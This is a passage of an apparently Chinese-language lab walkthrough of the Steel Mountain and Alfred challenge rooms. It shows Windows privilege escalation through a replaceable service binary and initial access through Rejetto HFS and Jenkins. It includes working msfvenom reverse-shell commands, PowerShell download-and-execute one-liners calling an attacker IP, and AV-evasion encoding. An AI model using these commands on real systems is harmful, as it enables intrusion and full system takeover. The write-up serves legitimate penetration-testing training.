Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe                               
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem                                                                          
AbuseFunction  : Write-ServiceBinary -Name <span class="hljs-string">'LiveUpdateSvc'</span> -Path                          
CanRestart     : False                                                                                
Name           : LiveUpdateSvc                                                                        
Check          : Unquoted Service Paths                                                               
                                                                                                      
ServiceName    : LiveUpdateSvc                                                                        
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe                               
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe;             
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System<span class="hljs-selector-class">.Object</span><span class="hljs-selector-attr">[]</span>}                   
StartName      : LocalSystem                                                                          
AbuseFunction  : Write-ServiceBinary -Name <span class="hljs-string">'LiveUpdateSvc'</span> -Path                          
CanRestart     : False                                                                                
Name           : LiveUpdateSvc                                                                        
Check          : Unquoted Service Paths                                                               
                                                                                                      
ServiceName                     : AdvancedSystemCareService9                                          
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe     
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe     
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory..
.}                                                                                                    
ModifiableFileIdentityReference : STEELMOUNTAIN\bill                                                  
StartName                       : LocalSystem                                                         
AbuseFunction                   : Install-ServiceBinary -Name <span class="hljs-string">'AdvancedSystemCareService9'</span>            
CanRestart                      : True                                                                
Name                            : AdvancedSystemCareService9                                          
Check                           : Modifiable Service Files                                            
                                                                                                      
ServiceName                     : IObitUnSvr                                                          
Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe        
ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe        
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory..
.}                                                                                                    
ModifiableFileIdentityReference : STEELMOUNTAIN\bill                                                  
StartName                       : LocalSystem                                                         
AbuseFunction                   : Install-ServiceBinary -Name <span class="hljs-string">'IObitUnSvr'</span>                            
CanRestart                      : False                                                               
Name                            : IObitUnSvr                                                          
Check                           : Modifiable Service Files                                            
                                                                                                      
ServiceName                     : LiveUpdateSvc                                                       
Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe              
ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe              
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory..
.}                                                                                                    
ModifiableFileIdentityReference : STEELMOUNTAIN\bill                                                  
StartName                       : LocalSystem                                                         
AbuseFunction                   : Install-ServiceBinary -Name <span class="hljs-string">'LiveUpdateSvc'</span>                         
CanRestart                      : False                                                               
Name                            : LiveUpdateSvc                                                       
Check                           : Modifiable Service Files</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839626.png" alt="image-20240404114223928"></p>
<p>查看输出，有一个特定服务的 CanRestart 选项被设置为 true，此选项被设置为 true 后，我们就能够在系统上重新启动此服务；而且这个应用程序的目录也是可写的，这意味着我们可以用一个恶意应用程序替换合法的应用程序，一旦服务重新启动，我们的恶意程序将运行。</p>
<blockquote>
<p>ServiceName ：AdvancedSystemCareService9</p>
<p>ModifiablePath：C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe</p>
</blockquote>
<p>msfvenom可用于生成反向shell的payload并将其输出为windows可执行文件，我们用msfvenom来生成一个和之前的应用程序同名的恶意应用程序:</p>
<pre><code class="hljs scss"><span class="hljs-selector-id">#msfvenom</span> -<span class="hljs-selector-tag">p</span> windows/shell_reverse_tcp LHOST=&lt;local_ip&gt; LPORT=&lt;local_port&gt; -e x86/shikata_ga_nai -f exe-service -o filename<span class="hljs-selector-class">.exe</span>

msfvenom -<span class="hljs-selector-tag">p</span> windows/shell_reverse_tcp LHOST=<span class="hljs-number">10.11</span><span class="hljs-selector-class">.81</span><span class="hljs-selector-class">.232</span> LPORT=<span class="hljs-number">8888</span> -e x86/shikata_ga_nai -f exe -o ASCService<span class="hljs-selector-class">.exe</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839627.png" alt="image-20240404114726030"></p>
<pre><code class="hljs scss">meterpreter &gt; upload /opt/windows/PowerSploit/ASCService<span class="hljs-selector-class">.exe</span>                                                                  
<span class="hljs-selector-attr">[*]</span> Uploading  : /opt/windows/PowerSploit/ASCService.exe -&gt; ASCService.exe                                                    
[*] Uploaded <span class="hljs-number">72.07</span> KiB of <span class="hljs-number">72.07</span> KiB (<span class="hljs-number">100.0%</span>): /opt/windows/PowerSploit/ASCService.exe -&gt; ASCService.exe                       
[*] Completed  : /opt/windows/PowerSploit/ASCService.exe -&gt; ASCService.exe                                                    
meterpreter &gt; shell                                                                                                           
Process <span class="hljs-number">2412</span> created.                                                                                                         
Channel <span class="hljs-number">6</span> created.                                                                                                            
Microsoft Windows [Version <span class="hljs-number">6.3</span>.<span class="hljs-number">9600</span>]                                                                                          
(c) <span class="hljs-number">2013</span> Microsoft Corporation. All rights reserved.                                                                          
                                                                                                                              
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt;sc stop AdvancedSystemCareService9                
sc stop AdvancedSystemCareService9                                                                                            
                                                                                                                              
SERVICE_NAME: AdvancedSystemCareService9                                                                                      
        TYPE               : <span class="hljs-number">110</span>  WIN32_OWN_PROCESS  (interactive)                                                            
        STATE              : <span class="hljs-number">4</span>  RUNNING                                                                                       
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)                                                       
        WIN32_EXIT_CODE    : <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)                                                                                         
        SERVICE_EXIT_CODE  : <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)                                                                                         
        CHECKPOINT         : <span class="hljs-number">0</span>x0                                                                                              
        WAIT_HINT          : <span class="hljs-number">0</span>x0                                                                                              
                                                                                                                              
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt;dir                                               
dir                                                                                                                           
 Volume in drive C has no label.                                                                                              
 Volume Serial Number is <span class="hljs-number">2</span>E4A-<span class="hljs-number">906</span>A                                                                                            
                                                                                                                              
 Directory of C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup                                     
                                                                                                                              
<span class="hljs-number">04</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">08</span>:<span class="hljs-number">48</span> PM              .                                                                                      
<span class="hljs-number">04</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">08</span>:<span class="hljs-number">48</span> PM              ..                                                                                     
<span class="hljs-number">04</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">08</span>:<span class="hljs-number">27</span> PM              %TEMP%                                                                                 
<span class="hljs-number">04</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">08</span>:<span class="hljs-number">48</span> PM            <span class="hljs-number">73</span>,<span class="hljs-number">802</span> ASCService.exe                                                                         
<span class="hljs-number">02</span>/<span class="hljs-number">16</span>/<span class="hljs-number">2014</span>  <span class="hljs-number">01</span>:<span class="hljs-number">58</span> PM           <span class="hljs-number">760</span>,<span class="hljs-number">320</span> hfs.exe                                                                                
<span class="hljs-number">04</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">08</span>:<span class="hljs-number">38</span> PM           <span class="hljs-number">600</span>,<span class="hljs-number">580</span> PowerUp.ps1                                                                            
               <span class="hljs-number">3</span> <span class="hljs-built_in">File</span>(s)      <span class="hljs-number">1</span>,<span class="hljs-number">434</span>,<span class="hljs-number">702</span> bytes                                                                                 
               <span class="hljs-number">3</span> <span class="hljs-built_in">Dir</span>(s)  <span class="hljs-number">44</span>,<span class="hljs-number">154</span>,<span class="hljs-number">744</span>,<span class="hljs-number">832</span> bytes free                                                                            
                                                                                                                              
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt;copy ASCService.exe <span class="hljs-string">"C:\Program Files (x86)\IObit\</span>
<span class="hljs-string">Advanced SystemCare\ASCService.exe"</span>                                                                                           
copy ASCService.exe <span class="hljs-string">"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"</span>                                         
Overwrite C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe? (Yes/No/All): yes                                  
yes                                                                                                                           
        <span class="hljs-number">1</span> <span class="hljs-built_in">file</span>(s) copied.</code></pre>
<p>关于SC命令（Windows shell不区分大小写）：</p>
<pre><code class="hljs scss">SC命令的格式：SC <span class="hljs-selector-attr">[Servername]</span> command Servicename <span class="hljs-selector-attr">[Optionname= Optionvalues]</span>

Servername：指定服务所在的远程服务器的名称。名称必须采用通用命名约定 (UNC) 格式（“\\myserver”）。如果是在本地运行SC<span class="hljs-selector-class">.exe</span>，请忽略此参数。
command ：如query,start,stop,create,config等

Servicename：服务名，也就是要配置的那个服务的名字，例如你要启动一个服务你就输入sc start +你要启动的服务名称（并非是服务显示名称）。
Optionname= Optionvalues：是选项名和选项的值。</code></pre>
<p>在重新启动服务之前，我们需要在攻击机终端中设置一个netcat侦听器:<code>nc -lvnp 8888</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839628.png" alt="image-20240404115159187"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839629.png" alt="image-20240404115309581"></p>
<h2 id="不使用metasploit获取初始访问权限并提权">不使用Metasploit获取初始访问权限并提权</h2>
<p>注意：此处建议重启目标机。</p>
<p>现在，我们来看看如何在不使用 Metasploit 的情况下获得初始权限和进行权限提升。为此，我们将使用 PowerShell 和 winPEAS 来枚举目标系统并收集相关信息以提权到管理员用户。</p>
<p>我们还是使用之前提到的CVE编号所对应的漏洞来获取初始访问权限，然而，这次我们手动使用exp而不是通过msf来执行exp。</p>
<blockquote>
<p>exp链接（一个python脚本）：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/39161">https://www.exploit-db.com/exploits/39161</a></p>
</blockquote>
<p>为了使这种攻击起作用，需要同时激活Web服务器和netcat侦听器，如果你的系统上还没有 netcat 静态二进制文件，那么你可以从GitHub下载。我们还将使用 winPEAS来枚举目标机系统信息。</p>
<blockquote>
<p>netcat二进制文件：<a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe">https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe</a></p>
<p>winPEAS（在下载页选择winPEASx64.exe）：<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/releases/tag/20221009">https://github.com/carlospolop/PEASS-ng/releases/tag/20221009</a></p>
</blockquote>
<p>为了方便起见，我新建了一个文件夹放置刚才下载的三个文件（exp脚本使用之前–记得修改好ip和端口，下载的netcat二进制文件要修改名称为nc.exe）：</p>
<blockquote>
<p>查看exp脚本内容，我们能够发现该脚本已经指定要调用名称为nc.exe的文件</p>
</blockquote>
<p>然后需要开启3个独立的终端窗口来完成攻击：</p>
<p>终端1-通过python启用 HTTP web 服务器</p>
<pre><code class="hljs scss">#终端界面进入到SteelMountain目录
<span class="hljs-selector-id">#python3</span> -m http<span class="hljs-selector-class">.server</span> <span class="hljs-number">8000</span> 无响应
python2 -m SimpleHTTPServer <span class="hljs-number">80</span></code></pre>
<p>终端2-设置netcat 监听器</p>
<pre><code class="hljs scss">nc -nvlp <span class="hljs-number">8888</span></code></pre>
<p>终端3-执行exp进行攻击（注意所用脚本的python版本）</p>
<pre><code class="hljs scss">#终端界面进入到/home/hekeats/桌面/SteelMountain目录
python2 <span class="hljs-number">39161</span><span class="hljs-selector-class">.py</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.61</span><span class="hljs-selector-class">.11</span> <span class="hljs-number">8080</span> #第一次执行会将SteelMountain/目录下的nc<span class="hljs-selector-class">.exe</span>上传到目标系统
python2 <span class="hljs-number">39161</span><span class="hljs-selector-class">.py</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.61</span><span class="hljs-selector-class">.11</span> <span class="hljs-number">8080</span> #第二次执行会发送一个反向shell回连到攻击机监听器</code></pre>
<p>在终端2界面 成功获取目标机的shell：（这里我执行了三次才行，估计是某些问题吧，应该是两次的）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839630.png" alt="image-20240404121817057"></p>
<p>使用Powershell相关命令将winPEAS脚本拉取到目标系统上：</p>
<pre><code class="hljs scss">#使用终端<span class="hljs-number">2</span>界面
cd C:\Users\Bill\Desktop
#Format is <span class="hljs-string">"powershell -c "</span>command here<span class="hljs-string">"</span>
<span class="hljs-string">powershell -c wget "</span>http://<span class="hljs-number">10.11</span>.<span class="hljs-number">81.232</span>/winPEASx64.exe<span class="hljs-string">" -outfile "</span>winPEAS.exe<span class="hljs-string">"</span></code></pre>
<p>运行winPEAS脚本（枚举目标系统的信息，如服务名称等）：</p>
<pre><code class="hljs scss">#使用终端<span class="hljs-number">2</span>界面
winPEAS<span class="hljs-selector-class">.exe</span>
#我们也可以运行powershell -c 命令手动查找服务名称:powershell -c <span class="hljs-string">"Get-Service"</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839631.png" alt="image-20240404122133962"></p>
<p>运行winPEAS之后，查看输出的服务信息，观察在运行时"未引用路径"的服务名称：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839632.png" alt="image-20240404122406649"></p>
<p>使用msfvenom生成一个exe形式的反向shell payload，输出的文件名和服务对应的文件名相同（此处payload设置的端口，不要使用刚刚建立普通shell的端口）：</p>
<pre><code class="hljs scss">#使用终端<span class="hljs-number">3</span>界面
msfvenom -<span class="hljs-selector-tag">p</span> windows/shell_reverse_tcp LHOST=<span class="hljs-number">10.11</span><span class="hljs-selector-class">.81</span><span class="hljs-selector-class">.232</span> LPORT=<span class="hljs-number">8888</span> -e x86/shikata_ga_nai -f exe -o ASCService<span class="hljs-selector-class">.exe</span></code></pre>
<p>然后可以通过 PowerShell 将这些数据传输到目标系统中:</p>
<pre><code class="hljs scss">#使用终端<span class="hljs-number">2</span>界面
powershell -c wget "http://<span class="hljs-number">10.11</span>.<span class="hljs-number">81.232</span>/ASCService.exe<span class="hljs-string">" -outfile "</span>ASCService.exe<span class="hljs-string">"</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839633.png" alt="image-20240404122642856"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839634.png" alt="image-20240404122744379"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839635.png" alt="image-20240404122913091"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839636.png" alt="image-20240404122923329"></p>
<h2 id="总结">总结</h2>
<p>依旧是nmap扫描，这里靠的是目标站web站点的漏洞，其中使用的是rejetto http file server，发现存在对应漏洞，接着利用msf成功拿到shell，接着就是提权，首先是通过powershell某个脚本，枚举出对方服务器的某个服务存存在配置错误问题，接着msfvenom生成了一个reverse_shell木马，上传到目标机，替换对应服务的exe之后，重新运行，拿到system权限。</p>
<p>然后还介绍了一个不通过msf提权的方法，主要就是利用exploit漏洞库对应的cve脚本，凭借该脚本利用方式还需要准备，nc.exe，winPEAS.exe，接着先监听拿到shell，上传winPEAS.exe来枚举靶机发现存在没有使用双引号引用路径的脆弱服务，按照上面的思路，依旧是替换他，重新运行，也是成功提权</p>
<h1 id="0x05-alfred挑战">0x05 Alfred挑战</h1>
<p>在这个房间里，我们将学习如何利用广泛使用的自动化服务器上的常见错误配置（Jenkins - 此工具用于创建持续集成/持续开发管道，允许开发人员在对代码进行更改后自动部署其代码）。之后，我们将使用一个有趣的权限提升方法来获得完整的系统访问权限。</p>
<p>由于这是一个 Windows 应用程序，我们将使用 Nishang 来获得初始访问权限。存储库包含一组有用的脚本，用于初始访问、枚举和权限提升。在本例中，我们将使用反向 shell 脚本。</p>
<p>请注意，此计算机不响应 ping （ICMP），可能需要几分钟才能启动。——我说怎么ping不通，以为我自己的问题</p>
<h2 id="初始访问">初始访问</h2>
<p>直接上nmap扫描：<code>nmap -T5 -sV -sC 10.10.40.248 -Pn</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839637.png" alt="image-20240406100639144"></p>
<p>接下来一个个访问发现在8080存在一个Jenkins工具，找到其工具下的一个命令执行功能，上传对应的powershell反弹shell脚本，最后执行，具体如下图</p>
<pre><code class="hljs scss">powershell iex (New-Object Net.WebClient)<span class="hljs-selector-class">.DownloadString</span>('http://<span class="hljs-number">10.11</span>.<span class="hljs-number">81.232</span>:<span class="hljs-number">81</span>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <span class="hljs-number">10.11</span><span class="hljs-selector-class">.81</span><span class="hljs-selector-class">.232</span> -Port <span class="hljs-number">5555</span>
<span class="hljs-comment">//构建好payload</span></code></pre>
<p>如下图，在首页点击new item创建新项目，接着到build功能下，写入payload，最后点击apply再save保存</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839638.png" alt="image-20240406104128713"></p>
<p>保存来到首页，点击build now，发现得到shell</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839639.png" alt="image-20240406104258342"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839640.png" alt="image-20240406104312253"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839641.png" alt="image-20240406104620515"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839642.png" alt="image-20240406104630421"></p>
<h2 id="切换shell">切换shell</h2>
<p>为了使权限提升变得更容易，让我们使用以下过程切换普通的反向shell到 Meterpreter shell。</p>
<p>第一步使用 msfvenom 创建一个能够生成Windows Meterpreter 反向shell的exe文件：</p>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> windows/meterpreter/reverse_tcp -<span class="hljs-selector-tag">a</span> x86 <span class="hljs-attr">--encoder</span> x86/shikata_ga_nai LHOST=<span class="hljs-number">10.11</span><span class="hljs-selector-class">.81</span><span class="hljs-selector-class">.232</span> LPORT=<span class="hljs-number">5555</span> -f exe -o hybcx<span class="hljs-selector-class">.exe</span></code></pre>
<p>以上有效载荷将生成一个经过编码处理的 x86-64 反向 tcp meterpreter shell文件，使用编码处理在一定程度上可以确保所生成的shell文件能够被正确传输，并且还可以逃避一些反病毒软件。</p>
<p>第二步，把生成的exe文件转移到nishang/Shells目录下，在nishang/Shells目录下创建http服务（<code>python3 -m http.server 8000</code>），继续修改以下命令：</p>
<pre><code class="hljs scss">powershell "(New-Object System.Net.WebClient)<span class="hljs-selector-class">.Downloadfile</span>('http://<span class="hljs-number">10.11</span>.<span class="hljs-number">81.232</span>:<span class="hljs-number">81</span>/hybcx.exe','hybcx.exe')"</code></pre>
<p>进入之前获取的普通反向shell界面，运行以上命令：以上命令会下载攻击机中的指定exe文件到目标机上（也可以使用与上个任务相同的方式来下载exe文件至目标机）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839643.png" alt="image-20240406105923360"></p>
<p>第三步，在攻击机上另外启动一个终端 用于设置MSF监听器，命令如下：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839644.png" alt="image-20240406105953592"></p>
<p>之后靶机上启动对应exe程序</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839645.png" alt="image-20240406110040068"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839646.png" alt="image-20240406110034640"></p>
<h2 id="权限提升">权限提升</h2>
<p>现在我们有了初始访问权限，我们就可以尝试使用令牌模拟来获得system访问权限（system权限是Windows系统中的最高级别权限）。Windows 可以使用令牌来确保某个账户具有执行特定操作的正确权限，当用户成功登录或通过身份验证机制时，账户令牌（tokens ）就会被分配给账户，这通常由 LSASS.exe 完成（你可以将其视为一个身份验证进程）。</p>
<p>此访问令牌包括以下信息：</p>
<ul>
<li>user SIDs(security identifier)</li>
<li>group SIDs</li>
<li>privileges</li>
</ul>
<p>除其他事项外，更详细的信息请参考：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens">https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens</a></p>
<p>有两种类型的访问令牌：</p>
<ul>
<li>主访问令牌(primary access tokens)：此类令牌是指与登录时所生成的用户账户相关联的令牌。</li>
